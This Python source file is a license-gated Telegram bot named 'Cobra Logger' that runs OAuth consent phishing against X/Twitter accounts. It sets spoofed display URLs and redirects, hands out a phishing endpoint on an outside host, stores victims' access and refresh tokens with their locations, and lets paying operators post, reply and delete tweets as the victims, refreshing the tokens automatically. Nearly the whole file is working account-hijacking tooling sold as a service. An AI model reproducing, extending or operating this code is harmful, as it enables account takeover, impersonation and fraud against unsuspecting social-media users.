import os
import re
import random
import string
import requests
import urllib.parse
import base64
import validators
import uuid
from datetime import datetime, timedelta
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from keep_alive import keep_alive
keep_alive()

client = MongoClient(os.environ["MONGO_URI"], server_api=ServerApi('1'))
db = client['db']
users = db['users']
groups = db['groups']
licenses = db['licenses']
templates = [
    {
        "name": "",
        "client_id": "",
        "client_secret": "",
        "spoof": "",
        "redirect": ""
    }
]

parse_mode = "MarkdownV2"

try:
    client.admin.command=('ping')
    print("[+] MongoDB has successfully connected.")
except Exception as e:
    print("[-] MongoDB has failed connecting.")
    print(e)

def generate_random_key(length=12, segment_length=4):
    characters = string.ascii_uppercase + string.digits
    key = ''.join(random.choice(characters) for _ in range(length))
    
    segments = [key[i:i+segment_length] for i in range(0, len(key), segment_length)]
    
    return '-'.join(segments)
    
async def check_license(user_id, chat_id, context):
    group = groups.find_one({"group_id": chat_id})
    
    if group:
        text = "⚠️ *License not found or has expired\\. Please purchase a license to continue using Cobra Logger\\.*"
        
        license = licenses.find_one({"used_by": group.get("owner_id"), "status": "active"})
        if not license:
            await context.bot.send_message(chat_id, text, parse_mode) 
            return False
        
        expiration_date = license.get("expiration_date")
        if expiration_date and datetime.utcnow() > expiration_date:
            license_data = {
                "status": "expired",
            }
            result = licenses.update_one(
                {"used_by": group.get("owner_id"), "status": "active"},
                {"$set": license_data}
            )
            
            await context.bot.send_message(chat_id, text, parse_mode) 
            return False
            
        return True
    else:
        text = "⚠️ *Group is not setup for OAuth\\.*\n\n💬 _Use the */setup* command to setup your group for OAuth\\._"
        await context.bot.send_message(chat_id, text, parse_mode) 
        return False


async def start(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    
    if context.args == None:
        return
        
    key = context.args[0]
    
    license = licenses.find_one({"key": key, "used_by": None})
    if not license:
        text="❌ *The license key you provided is invalid\\.*"
        return await context.bot.send_message(chat_id, text, parse_mode)
    
    user_id = update.effective_user.id
    username = update.effective_user.username
    
    if licenses.find_one({"used_by": user_id, "status": "active"}):
        text="⚠️ *A license is already active on your account\\.*"
        return await context.bot.send_message(chat_id, text, parse_mode)
    
    if not licenses.find_one({"used_by": user_id, "status": "expired"}):
        user_data = {
            "user_id": user_id,
            "username": username,
            "group_id": None
        }
        users.insert_one(user_data)
    
    license_data = {
        "used_by": user_id,
    }
    result = licenses.update_one(
        {"key": key},
        {"$set": license_data}
    )
    
    if result.modified_count > 0:
        expiration_date = license.get("expiration_date")
        expiration_msg = expiration_date.strftime('%Y\\-%m\\-%d') if expiration_date else "Never"
        
        text = f"🐍 *Welcome to Cobra Logger, _{update.effective_user.full_name}_*\\! 🐍\n\n✅ *Your license has been activated and will expire:* `{expiration_msg}`\n\n💬 _To get started, add me to a group and use the */setup* command to setup your group for OAuth\\._"
        await context.bot.send_message(chat_id, text, parse_mode)
    else:
        text = "⚠️ *An unknown error has occured\\.*"
        await context.bot.send_message(chat_id, text, parse_mode)


async def help(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    
    text = "❔ *List of Commands*\n\n *•* 🐦 */post\\_tweet* \\<username\\> \\<message\\> \\- Posts a tweet on behalf of the user\\.\n *•* 💬 */post\\_reply* \\<username\\> \\<tweet\\_id\\> \\<message\\> \\- Posts a reply to a tweet on behalf of the user\\.\n *•* ❌ */delete\\_tweet* \\<username\\> \\<tweet\\_id\\> \\- Deletes a tweet on behalf of the user\\.\n *•* 📋 */display\\_templates* \\- Displays the list of available OAuth application templates\\.\n *•* 👥 */display\\_users* \\- Displays the list of authenticated users\\.\n *•* 🔗 */display\\_endpoint* \\- Displays the group's endpoint\\.\n *•* 🆔 */set\\_client\\_id* \\<client\\_id\\> \\- Sets the OAuth application client id\\.\n *•* 🔒 */set\\_client\\_secret* \\<client\\_secret\\> \\- Sets the OAuth application client secret\\.\n *•* 🔄 */set\\_redirect* \\<option \\| url\\> \\- Sets the redirect upon authorization\\.\n *•* 🌀 */set\\_spoof* \\<option \\| url\\> \\- Sets the spoof url shown in X/Twitter\\.\n *•* 💬 */set\\_replies* \\- Enables/disables replies for tweets\\.\n *•* ❔ */help* \\- Displays the list of commands\\."
    await context.bot.send_message(chat_id, text, parse_mode)


async def setup(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    if update.effective_chat.type == "private":
        text = "❌ *This command can only be used in groups\\.*"
        
        await context.bot.send_message(chat_id, text, parse_mode) 
        return
        
    group = groups.find_one({"group_id": chat_id})
    if group:
        text = "⚠️ *This group is already setup for OAuth\\.*"
        await context.bot.send_message(chat_id, text, parse_mode)
        return
            
    owner_id = update.message.from_user.id
    owner_username = update.message.from_user.username
    group_name = update.message.chat.title
    identifier = str(uuid.uuid4())
    
    license = licenses.find_one({"used_by": owner_id, "status": "active"})
    if not license:
        text = "⚠️ *License not found\\. Please purchase a license to continue using Cobra Logger\\.*"
        await context.bot.send_message(chat_id, text, parse_mode)
        return
        
    expiration_date = license.get("expiration_date")
    if expiration_date and datetime.utcnow() > expiration_date:
        text = "⚠️ *License has expired\\. Please purchase a license to continue using Cobra Logger\\.*"
        await context.bot.send_message(chat_id, text, parse_mode) 
        return
    
    if license:
        group_data = {
            "group_id": chat_id,
            "group_name": group_name,
            "owner_id": owner_id,
            "owner_username": owner_username,
            "identifier": identifier,
            "spoof": templates[0]["spoof"],
            "redirect": templates[0]["redirect"],
            "endpoint": f"https://twit-oauth.onrender.com/oauth?identifier={identifier}",
            "replies": False,
            "authenticated_users": [],
            "twitter_settings": {
                "client_id": templates[0]["client_id"],
                "client_secret": templates[0]["client_secret"]
            }
        }
        groups.insert_one(group_data)
        
        user_data = {
            "group_id": chat_id
        }
        result = users.update_one(
            {"user_id": owner_id},
            {"$set": user_data}
        )
        
        group_name = filter_text(group_name)
        owner_username = filter_text(owner_username)
        
        if result.modified_count > 0:
            text = f"✅ *Group successfully setup for OAuth.*\n\n╭  ℹ️ *GROUP INFO*\n┣  *Group ID:* {group_data['group_id']}\n┣  *Group Name:* {group_data['group_name']}\n┣  *Owner: @{group_data['owner_username']}*\n╰  *Identifier:* {group_data['identifier']}\n\n💬 _Use the */help* command to get the list of available commands._"
            text = text.replace("-", "\\-").replace(".", "\\.").replace("!", "\\!")
            await context.bot.send_message(chat_id, text, parse_mode)
        else:
            text = "⚠️ *An unknown error has occured\\.*"
            await context.bot.send_message(chat_id, text, parse_mode)


async def set_redirect(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    
    if not await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context):
        return
    
    if update.effective_chat.type == "private":
        text = "❌ *This command can only be used in groups\\.*"
        
        await context.bot.send_message(chat_id, text, parse_mode) 
        return
    
    args = context.args
    if len(args) < 1:
        await update.message.reply_text(
            '⚙️ Usage: /set_redirect <url>')
        return
        
    url = args[0]
    
    matched_template = None
    for template in templates:
        if url == str(templates.index(template) + 1):
            matched_template = template
            break
    
    if matched_template:
        group_data = {
            "redirect": matched_template["redirect"]
        }
    elif validators.url(url):
        group_data = {
            "redirect": url
        }
    else:
        text = "⚠️ *The URL provided is invalid\\.*"
        return await context.bot.send_message(chat_id, text, parse_mode)

    groups.update_one(
        {"group_id": chat_id},
        {"$set": group_data}
    )
        
    text = filter_text(f"✅ *Redirect URL for this group successfully set to {url}.*")
    await context.bot.send_message(chat_id, text, parse_mode)
        
        
async def set_spoof(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    
    if not await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context):
        return
    
    if update.effective_chat.type == "private":
        text = "❌ *This command can only be used in groups\\.*"
        
        await context.bot.send_message(chat_id, text, parse_mode) 
        return
    
    args = context.args
    if len(args) < 1:
        await update.message.reply_text(
            '⚙️ Usage: /set_spoof <option | url>')
        return
        
    url = args[0]
    
    matched_template = None
    for template in templates:
        if url == str(templates.index(template) + 1):
            matched_template = template
            break
    
    if matched_template:
        group_data = {
            "spoof": matched_template["spoof"],
            "redirect": matched_template["redirect"]
        }
    elif validators.url(url):
        group_data = {
            "spoof": url
        }
    else:
        text = "⚠️ *The URL provided is invalid\\.*"
        return await context.bot.send_message(chat_id, text, parse_mode)
            
    groups.update_one(
        {"group_id": chat_id},
        {"$set": group_data}
    )
        
    text = filter_text(f"✅ *Spoofed URL for this group successfully set to {url}.*")
    await context.bot.send_message(chat_id, text, parse_mode)


async def set_replies(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    
    if not await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context):
        return
    
    if update.effective_chat.type == "private":
        text = "❌ *This command can only be used in groups\\.*"
        
        await context.bot.send_message(chat_id, text, parse_mode) 
        return
        
    group = groups.find_one({"group_id": chat_id})
    if group:
        group_data = {
            "replies": not group["replies"]
        }
        groups.update_one(
            {"group_id": chat_id},
            {"$set": group_data}
        )
        
        replies_msg = "_mentioned\\-only_\\." if group['replies'] else "_enabled_\\."
        text = f"✅ *Replies for tweets from accounts are now set to {replies_msg}*"
        await context.bot.send_message(chat_id, text, parse_mode)


async def set_client_id(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    
    if not await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context):
        return
    
    if update.effective_chat.type == "private":
        text = "❌ *This command can only be used in groups\\.*"
        
        await context.bot.send_message(chat_id, text, parse_mode) 
        return

    args = context.args
    if len(args) < 1:
        await update.message.reply_text(
            '⚙️ Usage: /set_client_id <client_id>')
        return
        
    group = groups.find_one({"group_id": chat_id})
    client_id = args[0]
    client_secret = group["twitter_settings"]["client_secret"]

    if re.match("^[a-zA-Z0-9]+$", client_id) and len(client_id) == 34:
        group_data = {
            "twitter_settings": {
                "client_id": client_id,
                "client_secret": client_secret
            }
        }
        groups.update_one(
            {"group_id": chat_id},
            {"$set": group_data}
        )
        
        group_name = filter_text(group["group_name"])
        client_secret = filter_text(client_secret)
        text = f"✅ *Client ID has successfully been set for this group\\.*\n\n*__{group_name}__*\n🆔 *Client ID:* {client_id}\n🔒 *Client Secret:* {client_secret}"
    else:
        text = "⚠️ *The client ID provided is invalid\\.*"
        
    await context.bot.send_message(chat_id, text, parse_mode)

async def set_client_secret(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    
    if not await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context):
        return
    
    if update.effective_chat.type == "private":
        text = "❌ *This command can only be used in groups\\.*"
        
        await context.bot.send_message(chat_id, text, parse_mode) 
        return

    args = context.args
    if len(args) < 1:
        await update.message.reply_text(
            '⚙️ Usage: /set_client_secret <client_secret>')
        return
        
    group = groups.find_one({"group_id": chat_id})
    client_secret = args[0]
    client_id = group["twitter_settings"]["client_id"]

    if (len(client_secret) == 50 and
        re.match("^[a-zA-Z0-9_-]+$", client_secret) and  
        any(c.isalpha() for c in client_secret) and      
        any(c.isdigit() for c in client_secret) and      
        '-' in client_secret and                         
        '_' in client_secret):
        group_data = {
            "twitter_settings": {
                "client_id": client_id,
                "client_secret": client_secret
            }
        }
        groups.update_one(
            {"group_id": chat_id},
            {"$set": group_data}
        )
        
        group_name = filter_text(group["group_name"])
        client_secret = filter_text(client_secret)
        text = f"✅ *Client secret has successfully been set for this group\\.*\n\n*__{group_name}__*\n🆔 *Client ID:* {client_id}\n🔒 *Client Secret:* {client_secret}"
    else:
        text = "⚠️ *The client secret provided is invalid\\.*"
        
    await context.bot.send_message(chat_id, text, parse_mode)

        
async def display_endpoint(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    
    if not await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context):
        return
    
    if update.effective_chat.type == "private":
        text = "❌ *This command can only be used in groups\\.*"
        
        await context.bot.send_message(chat_id, text, parse_mode) 
        return
        
    group = groups.find_one({"group_id": chat_id})
    if group:
        endpoint = group.get('endpoint')
        endpoint = filter_text(endpoint)
        text = f"🔗 *Endpoint: {endpoint}*"
        await context.bot.send_message(chat_id, text, parse_mode)
    else:
        text = "⚠️ *An unknown error has occurred\\.*"
        await context.bot.send_message(chat_id, text, parse_mode)
        

async def display_users(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    
    if not await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context):
        return
    
    if update.effective_chat.type == "private":
        text = "❌ *This command can only be used in groups\\.*"
        
        await context.bot.send_message(chat_id, text, parse_mode) 
        return
        
    group = groups.find_one({"group_id": chat_id})
    users = group['authenticated_users']
    if users:
        sorted_users = sorted(users, key=lambda u: (not bool(u.get('refresh_token')), -u['authorized_at'].timestamp()))

        user_chunks = [sorted_users[i:i + 5] for i in range(0, len(sorted_users), 5)]
        for chunk in user_chunks:
            user_texts = []
            for user in chunk:
                authorized_at = user['authorized_at'].strftime('%Y-%m-%d')
                authorized_at = filter_text(authorized_at)
                username = filter_text(user['username'])
                refresh_token = user.get('refresh_token')

                user_text = (
                    f"> {'🟢' if refresh_token else '🔴'} *[{username}](https://x\\.com/{username})*\n"
                    f"> 📍 *Location:* {user['location']}\n"
                    f"> 📅 *Authorized:* {authorized_at}"
                )
                user_texts.append(user_text)
            
            text = "*👤 Authenticated Users*\n\n" + "\n\n".join(user_texts)
            await context.bot.send_message(chat_id, text, parse_mode, disable_web_page_preview=True)   
    else:
        text = "*👤 Authenticated Users*\n\n> Nothing to see here 👀"
        await context.bot.send_message(chat_id, text, parse_mode, disable_web_page_preview=True)


async def display_templates(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    
    if not await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context):
        return
    
    if update.effective_chat.type == "private":
        text = "❌ *This command can only be used in groups\\.*"
        
        await context.bot.send_message(chat_id, text, parse_mode) 
        return
        
    temp_texts = []
    for i, temp in enumerate(templates, start=1):
        name = filter_text(temp["name"])
        client_id = filter_text(temp["client_id"])
        client_secret = filter_text(temp["client_secret"])
        spoof = filter_text(temp["spoof"])
        redirect = filter_text(temp["redirect"])
        
        temp_text = (
            f"> \\[{i}\\] *{name}*\n"
            f"> 🆔 *Client ID:* `{client_id}`\n"
            f"> 🔒 *Client Secret:* `{client_secret}`\n"
            f"> 🌀 *Spoof \\(ID: _{i}_\\):* {spoof}\n"
            f"> 🔗 *Redirect \\(ID: _{i}_\\):* {redirect}\n"
        )
        temp_texts.append(temp_text)
        
    text = "📋 *Templates*\n\n" + "\n".join(temp_texts)
    await context.bot.send_message(chat_id, text, parse_mode, disable_web_page_preview=True) 


async def post_tweet(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    
    if not await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context):
        return
        
    if update.effective_chat.type == "private":
        text = "❌ *This command can only be used in groups\\.*"
        
        await context.bot.send_message(chat_id, text, parse_mode) 
        return
            
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(
            '⚙️ Usage: /post_tweet <username> <message>')
        return
        
    group = groups.find_one({"group_id": chat_id})
    if not group: 
        text = "⚠️ *An unknown error has occurred\\.*"
        return await context.bot.send_message(chat_id, text, parse_mode)

    user = next((u for u in group.get('authenticated_users', []) if u['username'].lower() == args[0].lower()), None)
    if not user:
        text = f"⚠️ *User _{args[0]}_ has not authorized with OAuth\\.*"
        return await context.bot.send_message(chat_id, text, parse_mode)
        
    message = ' '.join(arg.strip()
                          for arg in args[1:]).replace('\\n', '\n')
    access_token, refresh_token, username = user.get("access_token"), user.get("refresh_token"), user["username"]
    if refresh_token:
        res, r = tweet(chat_id=chat_id, token=access_token, message=message)
        
        if res.status_code == 201:
            return await handle_successful_tweet(context, chat_id, username, r)
            
        if res.status_code == 401:
            return await handle_token_refresh_and_retry(context, chat_id, user, message, refresh_token)
    
        if res.status_code == 403:
            return await handle_token_refresh_and_retry(context, chat_id, user, message, refresh_token)

        await handle_generic_error(context, chat_id, res, r)
    else:
        username = filter_text(username)
        text = f"❌ *User _[{username}](https://x\\.com/{username})_ revoked OAuth access and is no longer valid\\.*"
        await context.bot.send_message(chat_id, text, parse_mode)
    

async def post_reply(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    
    if not await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context):
        return
        
    if update.effective_chat.type == "private":
        text = "❌ *This command can only be used in groups\\.*"
        
        await context.bot.send_message(chat_id, text, parse_mode) 
        return
        
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            '⚙️ Usage: /post_reply <username> <id> <message>')
        return
        
    group = groups.find_one({"group_id": chat_id})
    if not group: 
        text = "⚠️ *An unknown error has occurred\\.*"
        return await context.bot.send_message(chat_id, text, parse_mode)

    user = next((u for u in group.get('authenticated_users', []) if u['username'].lower() == args[0].lower()), None)
    if not user:
        text = f"⚠️ *User _{args[0]}_ has not authorized with OAuth\\.*"
        return await context.bot.send_message(chat_id, text, parse_mode)
        
    message = ' '.join(arg.strip()
                          for arg in args[2:]).replace('\\n', '\n')
    access_token, refresh_token, username = user.get("access_token"), user.get("refresh_token"), user["username"]
    if refresh_token:
        res, r = tweet(chat_id=chat_id, token=access_token, message=message, tweet_id=args[1])
        if res.status_code == 201:
            return await handle_successful_tweet(context, chat_id, username, r, is_reply=True)
            
        if res.status_code == 401:
            return await handle_token_refresh_and_retry(context, chat_id, user, message, refresh_token, tweet_id=args[1])
    
        if res.status_code == 403:
            return await handle_token_refresh_and_retry(context, chat_id, user, message, refresh_token, tweet_id=args[1])

        await handle_generic_error(context, chat_id, res, r)
    else:
        username = filter_text(username)
        text = f"❌ *User _[{username}](https://x\\.com/{username})_ revoked OAuth access and is no longer valid\\.*"
        await context.bot.send_message(chat_id, text, parse_mode)
    

async def delete_tweet(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    
    if not await check_license(user_id=update.effective_user.id, chat_id=chat_id, context=context):
        return
        
    if update.effective_chat.type == "private":
        text = "❌ *This command can only be used in groups\\.*"
        
        await context.bot.send_message(chat_id, text, parse_mode) 
        return
        
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(
            '⚙️ Usage: /delete_tweet <username> <id>')
        return
        
    group = groups.find_one({"group_id": chat_id})
    if not group: 
        text = "⚠️ *An unknown error has occurred\\.*"
        return await context.bot.send_message(chat_id, text, parse_mode)

    user = next((u for u in group.get('authenticated_users', []) if u['username'].lower() == args[0].lower()), None)
    if not user:
        text = f"⚠️ *User _{args[0]}_ has not authorized with OAuth\\.*"
        return await context.bot.send_message(chat_id, text, parse_mode)

    access_token, refresh_token, username = user.get("access_token"), user.get("refresh_token"), filter_text(user["username"])
    if refresh_token:
        url = f'https://api.twitter.com/2/tweets/{args[1]}'
        headers = {
            'Authorization': f'Bearer {access_token}',
            'Content-Type': 'application/json'
        }
        res = requests.delete(url, headers=headers)
        r = res.json()
        
        if res.status_code == 200:
            parse_mode = "MarkdownV2"
            text = f"✅ *Tweet successfully deleted by user [{username}](https://x\\.com/{username})\\.*\n" \
                f"🐦 *Tweet ID:* `{args[1]}`"
        elif res.status_code == 401:
            client_id = group["twitter_settings"]["client_id"]
            client_secret = group["twitter_settings"]["client_secret"]
            credentials = base64.b64encode(f"{client_id}:{client_secret}".encode("utf-8")).decode("utf-8")

            new_access_token, new_refresh_token = await refresh_oauth_tokens(refresh_token, credentials)
            if not new_access_token:
                groups.update_one(
                    {"group_id": chat_id, "authenticated_users.username": user["username"]},
                    {"$unset": {
                        "authenticated_users.$.access_token": "",
                        "authenticated_users.$.refresh_token": ""
                    }}
                )
                
                text = f"❌ *User _[{username}](https://x\\.com/{username})_ revoked OAuth access and is no longer valid\\.*"
                return await context.bot.send_message(chat_id, text, parse_mode)
                
            groups.update_one(
                {"group_id": chat_id, "authenticated_users.username": user["username"]},
                {"$set": {
                    "authenticated_users.$.access_token": new_access_token,
                    "authenticated_users.$.refresh_token": new_refresh_token or refresh_token
                }}
            )
            
            headers = {
                'Authorization': f'Bearer {new_access_token}',
                'Content-Type': 'application/json'
            }
            res = requests.delete(url, headers=headers)
            r = res.json()
            
            if res.status_code == 200:
                parse_mode = "MarkdownV2"
                text = f"✅ *Tweet successfully deleted by user [{username}](https://x\\.com/{username})\\.*\n" \
                    f"🐦 *Tweet ID:* `{args[1]}`"
            else:
                parse_mode = "MarkDown"
                text = f"Deletion failed:\n\n{r}"
        elif res.status_code == 403:
            client_id = group["twitter_settings"]["client_id"]
            client_secret = group["twitter_settings"]["client_secret"]
            credentials = base64.b64encode(f"{client_id}:{client_secret}".encode("utf-8")).decode("utf-8")

            new_access_token, new_refresh_token = await refresh_oauth_tokens(refresh_token, credentials)
            if not new_access_token:
                groups.update_one(
                    {"group_id": chat_id, "authenticated_users.username": user["username"]},
                    {"$unset": {
                        "authenticated_users.$.access_token": "",
                        "authenticated_users.$.refresh_token": ""
                    }}
                )
                
                text = f"❌ *User _[{username}](https://x\\.com/{username})_ revoked OAuth access and is no longer valid\\.*"
                return await context.bot.send_message(chat_id, text, parse_mode)
                
            groups.update_one(
                {"group_id": chat_id, "authenticated_users.username": user["username"]},
                {"$set": {
                    "authenticated_users.$.access_token": new_access_token,
                    "authenticated_users.$.refresh_token": new_refresh_token or refresh_token
                }}
            )
            
            headers = {
                'Authorization': f'Bearer {new_access_token}',
                'Content-Type': 'application/json'
            }
            res = requests.delete(url, headers=headers)
            r = res.json()
            
            if res.status_code == 200:
                parse_mode = "MarkdownV2"
                text = f"✅ *Tweet successfully deleted by user [{username}](https://x\\.com/{username})\\.*\n" \
                    f"🐦 *Tweet ID:* `{args[1]}`"
            else:
                parse_mode = "MarkDown"
                text = f"Deletion failed:\n\n{r}"
        else:
            parse_mode = "MarkDown"
            text = f"Deletion failed:\n\n{r}"
            
        await context.bot.send_message(chat_id, text, parse_mode)
    else:
        text = f"❌ *User _[{username}](https://x\\.com/{username})_ revoked OAuth access and is no longer valid\\.*"
        parse_mode = "MarkdownV2"
        await context.bot.send_message(chat_id, text, parse_mode)
    
    
async def generate_key(update: Update, context: CallbackContext) -> None:
    chat_id = get_chat_id(update)
    
    if update.message.from_user.id != 5074337318: return
    
    if len(context.args) != 1:
        await update.message.reply_text("⚙️ Usage: /generate_key <expiration>, e.g., /generate_key 1d, 7d, 1m, 1y, lifetime")
        return

    expiration = context.args[0]
    key = generate_random_key()
    expiration_date = None

    if expiration == '1d':
        expiration_date = datetime.now() + timedelta(days=1)
    elif expiration == '7d':
        expiration_date = datetime.now() + timedelta(days=7)
    elif expiration == '1m':
        expiration_date = datetime.now() + timedelta(days=30)
    elif expiration == '3m':
        expiration_date = datetime.now() + timedelta(days=90)
    elif expiration == 'lifetime':
        expiration_date = None
    else:
        await update.message.reply_text("Invalid expiration format. Use 1d, 7d, 1m, 1y, or lifetime.")
        return

    license_data = {
        "key": key,
        "used_by": None,
        "status": "active",
        "expiration_date": expiration_date
    }
    licenses.insert_one(license_data)

    expiration_msg = expiration_date.strftime('%Y-%m-%d') if expiration_date else "Lifetime"
    
    escaped_key = filter_text(key)
    escaped_expiration = filter_text(expiration_msg)

    text = f"☑️ *License Generated*\n\n📅 *Expiration:*\n`{escaped_expiration}`"
    await context.bot.send_message(chat_id, text, parse_mode)
    
    text = f"*[Activate Key \\[{expiration}\\]](https://t\\.me/uaODw8xjIam\\_bot?start={escaped_key})*"
    await context.bot.send_message(chat_id, text, parse_mode)

    
def get_chat_id(update: Update) -> int:
    return update.message.chat_id if update.message else update.callback_query.message.chat_id
    
    
def tweet(chat_id: int, token: str, message: str, tweet_id=0) -> tuple:
    url = 'https://api.x.com/2/tweets'
    if tweet_id == 0:
        group = groups.find_one({"group_id": chat_id})
        
        if not group["replies"]:
            json = {'text': message, 'reply_settings': "mentionedUsers"}
        else:
            json = {'text': message}
    else:
        json = {'text': message, 'reply': {'in_reply_to_tweet_id': tweet_id}}
    headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}
    res = requests.post(url=url, json=json, headers=headers)
    return res, res.json()


async def handle_successful_tweet(context: CallbackContext, chat_id: int, username: str, response: dict, is_reply=False) -> None:
    tweet_id = response['data']['id']
    username = filter_text(username)
    text = f"✅ *{'Reply' if is_reply else 'Tweet'} successfully posted by user _{username}_\\.*\n" \
        f"🐦 *Tweet ID:* `{tweet_id}`\n" \
        f"🔗 __*[View {'reply' if is_reply else 'tweet'}](https://x\\.com/{username}/status/{tweet_id})*__"
    
    if not is_reply:
        group = groups.find_one({"group_id": chat_id})

        replies_msg = "enabled" if group["replies"] else "restricted to mentioned only"
        replies_msg2 = "disable" if group["replies"] else "enable"
        text += f"\n\n💬 _Replies for this tweet are {replies_msg}\\. To {replies_msg2} replies for tweets, use the command */set\\_replies*\\._"
        
    await context.bot.send_message(chat_id, text, parse_mode)
    
    
async def handle_generic_error(context: CallbackContext, chat_id: int, res: requests.Response, response: dict) -> None:
    if res.status_code == 403 and 'detail' in response:
        parse_mode = "MarkdownV2"
        if 'duplicate content' in response['detail']:
            text = "❌ *Tweet failed to post\\.*\n" \
                   "⚠️ *Reason:* Duplicate content detected\\. You cannot post the same tweet multiple times\\."
        elif 'deleted' in response['detail'] or 'not visible' in response['detail']:
            text = "❌ *Reply failed to post\\.*\n" \
                   "⚠️ *Reason:* The tweet you attempted to reply to has been deleted or is not visible to you\\."
        else:
            parse_mode = "MarkDown"
            text = f"❌ *Failed to post tweet.*\n" \
                   f"⚠️ *Error code:* {res.status_code}\n" \
                   f"🛑 *Details:* {response.get('detail', 'Unknown error')}"
    else:
        parse_mode = "MarkDown"
        text = f"❌ *Failed to post tweet.*\n" \
               f"⚠️ *Error code:* {res.status_code}\n" \
               f"🛑 *Details:* {response.get('detail', 'Unknown error')}"

    await context.bot.send_message(chat_id, text, parse_mode)
    
    
async def handle_token_refresh_and_retry(context: CallbackContext, chat_id: int, user: dict, message: str, refresh_token: str, tweet_id=0) -> None:
    group = groups.find_one({"group_id": chat_id})
    
    client_id = group["twitter_settings"]["client_id"]
    client_secret = group["twitter_settings"]["client_secret"]
    credentials = base64.b64encode(f"{client_id}:{client_secret}".encode("utf-8")).decode("utf-8")

    new_access_token, new_refresh_token = await refresh_oauth_tokens(refresh_token, credentials)
    if not new_access_token:
        groups.update_one(
            {"group_id": chat_id, "authenticated_users.username": user["username"]},
            {"$unset": {
                "authenticated_users.$.access_token": "",
                "authenticated_users.$.refresh_token": ""
            }}
        )
        
        username = filter_text(user["username"])
        
        text = f"❌ *User [{username}](https://x\\.com/{username}) revoked OAuth access and is no longer valid\\.*"
        return await context.bot.send_message(chat_id, text, parse_mode)
        
    groups.update_one(
        {"group_id": chat_id, "authenticated_users.username": user["username"]},
        {"$set": {
            "authenticated_users.$.access_token": new_access_token,
            "authenticated_users.$.refresh_token": new_refresh_token or refresh_token
        }}
    )

    res, r = tweet(chat_id, new_access_token, message, (tweet_id if tweet_id != 0 else 0))
    if res.status_code == 201:
        await handle_successful_tweet(context, chat_id, user["username"], r, is_reply=(tweet_id != 0))
    else:
        await handle_generic_error(context, chat_id, res, r)
    
    
async def refresh_oauth_tokens(refresh_token: str, credentials) -> tuple:
    url = 'https://api.twitter.com/2/oauth2/token'
    data = {
        'grant_type': 'refresh_token',
        'refresh_token': refresh_token
    }
    headers = {'Authorization': f'Basic {credentials}', 'Content-Type': 'application/x-www-form-urlencoded'}

    try:
        res = requests.post(url=url, data=data, headers=headers)
        r = res.json()
        return r.get("access_token"), r.get("refresh_token")
    except Exception:
        return None, None
        
                        
def filter_text(text: str):
    return text.replace('_', '\\_').replace('-', '\\-').replace('.', '\\.').replace('!', '\\!').replace('(', '\\(').replace(')', '\\)').replace('[', '\\[').replace(']', '\\]').replace('=', '\\=').replace('<', '\\<').replace('>', '\\>')
        
    
def main() -> None:
    app = Application.builder().token(os.environ["TELEGRAM_BOT_TOKEN"]).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help))
    app.add_handler(CommandHandler("setup", setup))
    app.add_handler(CommandHandler("post_tweet", post_tweet))
    app.add_handler(CommandHandler("post_reply", post_reply))
    app.add_handler(CommandHandler("delete_tweet", delete_tweet))
    app.add_handler(CommandHandler("set_redirect", set_redirect))
    app.add_handler(CommandHandler("set_spoof", set_spoof))
    app.add_handler(CommandHandler("set_replies", set_replies))
    app.add_handler(CommandHandler("set_client_id", set_client_id))
    app.add_handler(CommandHandler("set_client_secret", set_client_secret))
    app.add_handler(CommandHandler("display_endpoint", display_endpoint))
    app.add_handler(CommandHandler("display_users", display_users))
    app.add_handler(CommandHandler("display_templates", display_templates))
    app.add_handler(CommandHandler("generate_key", generate_key))
    app.run_polling(poll_interval=5)


if __name__ == '__main__':
    main()
